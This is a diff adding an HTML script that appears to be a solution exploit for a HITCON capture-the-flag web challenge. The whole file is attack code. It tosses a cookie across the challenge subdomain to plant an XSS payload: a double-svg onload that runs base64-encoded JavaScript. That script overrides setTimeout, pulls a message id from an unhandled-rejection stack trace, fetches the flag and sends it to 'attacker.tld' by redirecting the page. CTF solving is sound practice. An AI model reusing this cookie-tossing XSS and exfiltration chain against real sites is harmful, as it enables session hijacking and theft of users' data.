@@ -1,0 +1,22 @@
+<script>
+    const rceXssRoute = 'http://subdomain.rce.chal.hitconctf.com/xss?xss=';
+    const js = `
+    window.addEventListener('unhandledrejection', e => {
+        // steal flag message id from unhandledrejection event
+        const id = e.reason.stack.match(/\/message\/(\w+)/)[1];
+        fetch('/api/message/' + id, {cache: 'force-cache'})
+            .then(r => r.json())
+            .then(r => location.href = "http://attacker.tld/?flag="+r.content);
+    });
+    // make setTimeout failed and trigger the event above
+    window.setTimeout = 0;
+    `;
+
+    // trigger xss immediately with double svg
+    const payload = `<svg><svg/onload='eval(atob("${btoa(js)}")}))'>`;
+
+    // tossing the time cookie
+    location = rceXssRoute + encodeURIComponent(`<script>
+        document.cookie = "time=" + atob("${btoa(payload)}") + "; domain=.chal.hitconctf.com"
+    <\/script>`);
+</script>
